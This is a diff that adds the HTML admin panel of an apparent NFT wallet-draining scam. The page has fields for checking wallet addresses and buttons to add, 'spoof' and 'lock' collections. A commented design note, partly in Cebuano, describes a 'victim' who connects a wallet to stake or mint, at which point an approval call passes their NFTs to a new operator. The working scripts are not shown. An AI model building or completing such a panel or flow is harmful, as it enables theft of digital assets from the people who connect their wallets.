@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script
+    src="https://code.jquery.com/jquery-3.7.1.min.js"
+    integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo="
+    crossorigin="anonymous"
+  ></script>
+
+  <link rel="stylesheet" href="style.css">
+
+  <style>
+    .remove {
+      background-color: brown
+    }
+
+    .add {
+      background-color: green;
+    }
+  </style>
+</head>
+<body>
+
+<!-- <pre>ang connect, sa main site rana.. wala na diri</pre> -->
+
+<!-- <button id="connect">
+connect
+</button> -->
+<br><br>
+<!-- connected address -->
+<!-- <div id="connected_account"></div> -->
+<!-- <input type="text" id="inputAddress" value="0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262">&nbsp; <button id="CHECK">CHECK</button> -->
+<input type="text" id="inputAddress" value="">&nbsp; <button id="CHECK">CHECK</button>
+<br><br>
+<input type="text" id="add_contract" value=""> &nbsp; <button id="ADD">ADD</button>
+
+
+<div id="spoofed">
+
+    <div class="spoofItem" id="contractaddress">
+      <!-- <span>name</span> -->
+    </div>
+
+    
+
+</div>
+
+
+<!-- <button id="get_collection">get collection</button> &nbsp;  -->
+<button id="add_collection">add collection</button> &nbsp; 
+<button id="lock_collection">lock collection</button>
+<br><br>
+
+<div class="collections">
+
+
+</div>
+
+
+
+</div>
+
+<hr><hr>
+<br><br><br><br><br><br><br><br><br><br><br><br><br>
+<!-- <pre>
+opensea api! fetch NFT!
+PERMISSION!
+PANEL
+PICTURE ID SHIT WHATEVER
+web3.eth.sendTransaction!!! para direct sa extension choi
+abi!
+
+LITESPEED
+RARIBLE CHOI
+spoof list pag iclick ang collection.. save dayon?
+need ka ug wallet nga naay nft para example pero dapat na lock na siya sa panel... so ang address igo ra iinput Sa panel.
+
+user: connect, check if naa sa database done. if wala sa database, get NFT ra.
+
+panel: lock address... ug spoof collection(contract)
+
+sa pag confirm na dayon sa user.. sa panel kato ra ang selected ang mabutang sa array spoof collection
+
+naay freeUser ug LockUser.. freeUser kanang gabuot2 ra..
+
+ang Connect na button.. sa userPage rana! wala na sa panel!
+
+FIREBASE DATABASE... json lang sa gamita as local data?
+
+...
+...
+..
+
+Sa normal page... locked/userbasta
+connect wallet ang victim, makapili siya sa iya NFT nga istake... dayon pag confirm sa stake... confirmation sa iya collection
+
+Sa mint wala nay pili2, pagpislit mint, getApproved na diritsu.. yeye
+
+- getapproved... test dayon if makita sa new operator ang nft sa victim
+</pre> -->
+
+<script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js@1.0.0-beta.34/dist/web3.min.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.7/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.7/firebase-firestore-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.7/firebase-auth-compat.js"></script>
+<script src="lock.js"></script>
+<script src="normal.js"></script>
+
+</body>
+</html>
